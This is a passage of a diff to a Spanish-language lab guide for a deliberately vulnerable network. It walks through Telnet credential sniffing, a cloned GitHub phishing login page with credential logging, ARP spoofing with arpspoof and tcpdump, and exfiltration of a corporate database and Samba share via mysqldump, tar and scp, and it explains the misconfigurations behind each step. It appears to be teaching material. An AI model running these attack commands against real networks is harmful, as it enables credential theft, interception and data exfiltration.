+t
+o
+r
+Password: f
+t
+p
+o
+p
+e
+r
+a
+t
+o
+r
+```
+
+**Interpretación**: el nombre de usuario y la contraseña aparecen en texto claro, carácter por carácter, en la salida de `tcpdump`. Esto demuestra que cualquier tráfico Telnet puede ser interceptado y leído sin necesidad de herramientas avanzadas de descifrado.
+
+#### Malas prácticas que habilitan este ataque
+
+- Uso de Telnet en lugar de SSH para acceso remoto.
+- Transmisión de credenciales sin cifrado.
+- Ausencia de segmentación que impida a un atacante en la red externa capturar tráfico de la DMZ.
+
+---
+
+### 5.2.4 Phishing interno: captura de credenciales mediante página falsa
+
+#### Contexto
+
+El phishing es una técnica de ingeniería social que consiste en suplantar la identidad de un servicio legítimo para engañar a las víctimas y obtener sus credenciales. En este laboratorio, el propio servidor DMZ aloja una página que imita el login de GitHub.
+
+El atacante no necesita montar ninguna infraestructura externa: el phishing se sirve desde la propia DMZ comprometida, lo que aumenta la credibilidad ante las víctimas internas.
+
+#### Acceso a la página de phishing
+
+**Ejecutar desde `external-kali`:**
 
 ```bash
-sudo killall arpspoof tcpdump
+# Ver la página de phishing
+curl http://192.168.57.10:8080
+```
+
+**Salida esperada**: HTML de una página idéntica al login de GitHub, con logo, formulario de usuario/contraseña, botones OAuth simulados (Google, GitHub Enterprise) y estilos CSS que replican el diseño oficial.
+
+#### Envío simulado de credenciales
+
+El atacante puede simular el envío de credenciales desde una supuesta víctima para verificar que la captura funciona:
+
+```bash
+curl -X POST http://192.168.57.10:8080/capture.php \
+  -d "username=admin&password=Password123!"
+```
+
+#### Recolección de credenciales capturadas
+
+Una vez que el atacante tiene acceso al `dmz-server` (por Telnet o SSH con las credenciales ya obtenidas), puede leer el archivo de log donde se almacenan las capturas:
+
+**Ejecutar desde `dmz-server` (previa conexión por Telnet o SSH):**
+
+```bash
+cat /var/log/phishing.log
+```
+
+**Salida esperada:**
+
+```text
+[2026-06-19 08:20:15] IP=100.70.9.10 | user=admin | pass=Password123! | ua=curl/8.4.0
+```
+
+**Interpretación**: cada envío del formulario queda registrado con timestamp, IP de origen, usuario, contraseña y User-Agent. En un escenario real, este archivo contendría las credenciales de usuarios internos que hayan picado en el engaño.
+
+#### Malas prácticas que habilitan este ataque
+
+- Alojamiento de un sitio de phishing en el propio servidor corporativo.
+- VirtualHost Apache que permite servir contenido malicioso en el puerto 8080.
+- Escritura de credenciales en texto plano en un archivo de log sin protección.
+- Acceso SSH con credencial débil que permite al atacante recolectar los logs.
+
+## 5.4 Ataques de red: ARP Spoofing y captura de tráfico
+
+### Contexto
+
+ARP Spoofing (o envenenamiento ARP) es un ataque de red que consiste en falsificar mensajes ARP para asociar la dirección MAC del atacante con la IP de otro equipo legítimo. Una vez logrado, el atacante se sitúa en medio de la comunicación entre dos dispositivos (Man-in-the-Middle) y puede interceptar, leer y modificar el tráfico.
+
+En este laboratorio, el atacante en la red externa puede ejecutar ARP spoofing contra la DMZ y el firewall para capturar tráfico que de otra forma no vería, como las credenciales Telnet.
+
+### ¿Por qué es posible este ataque?
+
+ARP es un protocolo de resolución de direcciones sin autenticación. Por diseño, cualquier host puede responder a una solicitud ARP, incluso si la IP no le pertenece. En redes modernas, existen protecciones como DAI (Dynamic ARP Inspection) o switches gestionados, pero en este laboratorio no hay ninguna.
+
+Además, el firewall tiene `rp_filter` desactivado y `accept_redirects` habilitado, lo que facilita la suplantación y el desvío de tráfico.
+
+### Ejecución del ataque
+
+El ataque se realiza desde `external-kali` contra los hosts de la red DMZ. Se necesitan dos terminales: una para envenenar las tablas ARP y otra para capturar el tráfico.
+
+**Paso 1: habilitar forwarding**
+
+El atacante debe permitir que el tráfico pase a través de su máquina para que las víctimas no pierdan conectividad y no sospechen.
+
+```bash
+# Ejecutar desde external-kali
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+**Paso 2: iniciar el envenenamiento ARP**
+
+Se envenenan simultáneamente las tablas ARP del `dmz-server` y del `firewall`, haciendo creer a cada uno que la MAC del atacante es la del otro.
+
+```bash
+# Ejecutar desde external-kali
+
+# Terminal 1: envenenar ARP del dmz-server diciendo que somos el firewall
+sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
+
+# Terminal 2: envenenar ARP del firewall diciendo que somos el dmz-server
+sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &
+```
+
+**Salida esperada en cada terminal:**
+
+```text
+8:15:22.123456 00:1a:2b:3c:4d:5e 00:0c:29:aa:bb:cc 0806 42: arp reply 192.168.57.1 is-at 00:1a:2b:3c:4d:5e
+8:15:23.234567 00:1a:2b:3c:4d:5e 00:0c:29:aa:bb:cc 0806 42: arp reply 192.168.57.1 is-at 00:1a:2b:3c:4d:5e
+```
+
+Cada línea representa un paquete ARP falsificado enviado a la víctima. El atacante repite continuamente la mentira para que las tablas ARP no expiren.
+
+**Paso 3: capturar tráfico Telnet**
+
+Mientras el envenenamiento está activo, el tráfico entre el `dmz-server` y el `firewall` pasa por la máquina atacante. Ahora se puede capturar cualquier comunicación en texto claro, como Telnet.
+
+```bash
+# Ejecutar desde external-kali (en otra terminal)
+sudo tcpdump -i eth1 -A -s0 port 23
+```
+
+**Paso 4: generar tráfico Telnet**
+
+En otra terminal, o esperando a que un usuario legítimo lo haga, se inicia una sesión Telnet:
+
+```bash
+# Ejecutar desde external-kali (o desde cualquier máquina de la red)
+telnet 192.168.57.10
+# Iniciar sesión con ftpoperator / ftpoperator
+```
+
+**Salida esperada en tcpdump (fragmento):**
+
+```text
+09:30:15.123456 IP 192.168.57.10.telnet > 192.168.57.1.34567: Flags [P.], seq 1:20, ack 1, win 229, length 19
+E..;..@.@........9...e...P...;.........
+Ubuntu 22.04.5 LTS
+dmz-server login: f
+t
+p
+o
+p
+e
+r
+a
+t
+o
+r
+Password: f
+t
+p
+o
+p
+e
+r
+a
+t
+o
+r
+```
+
+**Interpretación**: aunque Telnet ya transmite en claro de por sí, el ARP spoofing permite capturar este tráfico incluso si el atacante no está en el mismo segmento que la víctima o el servidor. Las credenciales aparecen carácter por carácter en la captura, legibles sin ninguna herramienta de descifrado.
+
+**Paso 5: detener el ataque**
+
+Para restaurar el funcionamiento normal de la red:
+
+```bash
+# Ejecutar desde external-kali
+sudo killall arpspoof
+sudo killall tcpdump
 sudo sysctl -w net.ipv4.ip_forward=0
 ```
 
-**Salida esperada**: `tcpdump` imprime el login y la contraseña en texto claro.
+#### Malas prácticas que habilitan este ataque
 
-(Insertar captura: `../../images/05-arp-spoofing.png`)
-
-**Malas prácticas implicadas**:
-
-- `rp_filter` desactivado (§4.1.2)
-- `accept_redirects` y `send_redirects` habilitados (§4.1.2)
-- Telnet sin cifrado (§4.2.6)
-- Sin protección ARP (DAI, etc.) en el firewall
+- `rp_filter` desactivado en el firewall, lo que permite tráfico con IP de origen falsificada.
+- `accept_redirects` y `send_redirects` habilitados, facilitando la manipulación de rutas.
+- Sin protección ARP a nivel de switch (DAI, DHCP Snooping) ni de firewall.
+- Telnet transmite credenciales sin cifrar, haciendo que la captura sea directamente legible.
+- Sin IDS/IPS que detecte paquetes ARP sospechosos o actividad de envenenamiento.
 
 ---
 
-## 5.5 Pivoting DMZ → red interna
+## 5.5 Exfiltración de datos
 
-Tras haber obtenido acceso al `dmz-server` (por Telnet o SSH), el atacante lo usa como trampolín para acceder a servicios internos.
+### Contexto
 
-```bash
-# Acceso a la DMZ
-ssh ftpoperator@192.168.57.10
+La exfiltración es la fase final del ataque: extraer información valiosa de la red comprometida hacia un punto controlado por el atacante. En este laboratorio, tras haber comprometido tanto la DMZ como la red interna, el atacante recolecta la base de datos corporativa y los archivos confidenciales de Samba, transfiriéndolos a la DMZ para su posterior descarga.
 
-# Dentro del dmz-server:
+### ¿Por qué es posible la exfiltración?
 
-# Acceso MySQL interno
-mysql -h 192.168.58.10 -u root
-mysql> SELECT * FROM corporativedb.user_credentials;
+En un entorno correctamente securizado, la exfiltración estaría bloqueada por:
 
-# Acceso Samba interno
-smbclient //192.168.58.10/confidential -N
+- **Segmentación**: el servidor interno no tendría rutas hacia la DMZ.
+- **Monitorización**: los logs del firewall registrarían transferencias anómalas.
+- **DLP (Data Loss Prevention)**: sistemas que detectan y bloquean la salida de datos sensibles.
 
-# Acceso SSH al servidor interno (credenciales reutilizadas)
-ssh root@192.168.58.10
-```
+En este laboratorio, ninguna de estas medidas existe.
 
-**Salida esperada**: shell en `internal-server`, consulta a la base de datos y acceso al recurso Samba.
+### Recolección de datos en el servidor interno
 
-**Malas prácticas implicadas**:
+Una vez obtenido acceso como root al `internal-server`, el atacante prepara la información para su extracción.
 
-- Firewall sin filtrado entre DMZ e interna (§4.1.1)
-- Rutas estáticas que permiten tráfico DMZ → interna (§4.2.10)
-- Credenciales reutilizadas y almacenadas en texto plano (§4.2.4, §4.2.5, §4.3.4)
-
----
-
-## 5.6 Exfiltración de datos
-
-Con control total sobre el servidor interno, el atacante procede a extraer información sensible hacia la DMZ (o hacia la máquina atacante).
+**Ejecutar desde `internal-server` (previa conexión SSH como root):**
 
 ```bash
-# Desde internal-server (accedido vía SSH como root):
-
-# Dump completo de MySQL
+# Dump completo de la base de datos corporativa
 mysqldump -u root corporativedb > /tmp/corporativedb.sql
 
-# Comprimir recurso Samba
+# Comprimir el recurso Samba confidential
 tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/
 
-# Exfiltrar a la DMZ (usando credenciales ya conocidas)
+# Verificar los archivos generados
+ls -lh /tmp/corporativedb.sql /tmp/confidential.tar.gz
+```
+
+**Salida esperada:**
+
+```text
+-rw-r--r-- 1 root root 2,3K Jun 19 09:35 /tmp/corporativedb.sql
+-rw-r--r-- 1 root root  456 Jun 19 09:35 /tmp/confidential.tar.gz
+```
+
+**Interpretación**: en pocos segundos, el atacante ha empaquetado toda la información sensible del servidor interno en dos archivos listos para transferir. El dump de MySQL contiene las tablas `user_credentials`, `network_inventory` y `employees`. El archivo `confidential.tar.gz` contiene el recurso Samba con el archivo `passwords.txt`.
+
+### Transferencia de los datos a la DMZ
+
+El atacante usa las credenciales ya conocidas para transferir los archivos al `dmz-server`.
+
+**Ejecutar desde `internal-server` (como root):**
+
+```bash
+# Transferir el dump de MySQL a la DMZ
 scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
+
+# Transferir el archivo comprimido de Samba a la DMZ
 scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
 ```
 
-El atacante puede luego recuperar los archivos desde la DMZ (vía SSH o FTP) o directamente desde el servidor interno si la conectividad lo permite.
+**Salida esperada:**
 
-**Salida esperada**: los archivos `corporativedb.sql` y `confidential.tar.gz` residen en la DMZ, listos para ser descargados por el atacante sin que se registre ninguna actividad sospechosa.
+```text
+corporativedb.sql                          100% 2356     2.3KB/s   00:00
+confidential.tar.gz                        100%  456     0.4KB/s   00:00
+```
 
-**Malas prácticas implicadas**:
+### Recuperación de los datos por el atacante
 
-- Ausencia de monitorización y logging en firewall (§4.1.3)
-- Ausencia de segmentación real (§4.1.1)
-- Rutas estáticas que permiten tráfico desde la interna hacia la DMZ (§4.3.6)
-- Sin control de exfiltración ni DLP
+Una vez los archivos están en la DMZ, el atacante puede descargarlos desde `external-kali` usando SSH.
+
+**Ejecutar desde `external-kali`:**
+
+```bash
+# Conectar al dmz-server con las credenciales ya conocidas
+ssh ftpoperator@192.168.57.10
+
+# Dentro del dmz-server, verificar que los archivos están
+ls -lh /tmp/*.sql /tmp/*.tar.gz
+```
+
+**Salida esperada:**
+
+```text
+-rw-r--r-- 1 ftpoperator ftpoperator 2356 Jun 19 09:36 /tmp/corporativedb.sql
+-rw-r--r-- 1 ftpoperator ftpoperator  456 Jun 19 09:36 /tmp/confidential.tar.gz
+```
+
+Para llevar los archivos a la máquina atacante, se puede usar `scp` de vuelta:
+
+```bash
+# Desde external-kali
+scp ftpoperator@192.168.57.10:/tmp/corporativedb.sql .
+scp ftpoperator@192.168.57.10:/tmp/confidential.tar.gz .
+```
+
+O simplemente leer los datos desde el propio `dmz-server`:
+
+```bash
+# Ver el contenido del dump de MySQL
+cat /tmp/corporativedb.sql | head -50
+
+# Extraer y ver passwords.txt desde el tar
+tar -xzf /tmp/confidential.tar.gz -O
+```
+
+#### Interpretación final
+
+El atacante ha conseguido:
+
+- Una copia completa de la base de datos corporativa, incluyendo credenciales, datos personales de empleados e inventario de red.
+- El recurso Samba con el archivo de contraseñas que da acceso a todos los servicios.
+
+Todo ello sin que ningún sistema haya registrado la actividad, alertado al administrador o bloqueado la transferencia. En un caso real, esta información podría venderse, usarse para chantaje o emplearse para comprometer sistemas adicionales.
+
+#### Malas prácticas que habilitan este ataque
+
+- Ausencia total de monitorización y logging en el firewall.
+- Ausencia de segmentación real: el servidor interno tiene rutas hacia la DMZ y puede iniciar conexiones.
+- Sin control de exfiltración de datos (DLP).
+- Credenciales reutilizadas que permiten mover archivos entre servidores.
+- Almacenamiento de toda la información sensible en un único servidor sin cifrado en reposo.
+
+<br>
+<table style="width: 100%; border: none;">
+  <tr>
+    <td style="text-align: left; border: none; padding: 0;">
+      <a href="04-malas-practicas.md">← Anterior</a>
+    </td>
+    <td style="text-align: center; border: none; padding: 0;">
+      <a href="../README.md">Volver al índice</a>
+    </td>
+    <td style="text-align: right; border: none; padding: 0;">
+      <a href="06-solucion-problemas.md">Siguiente →</a>
+    </td>
+  </tr>
+</table>
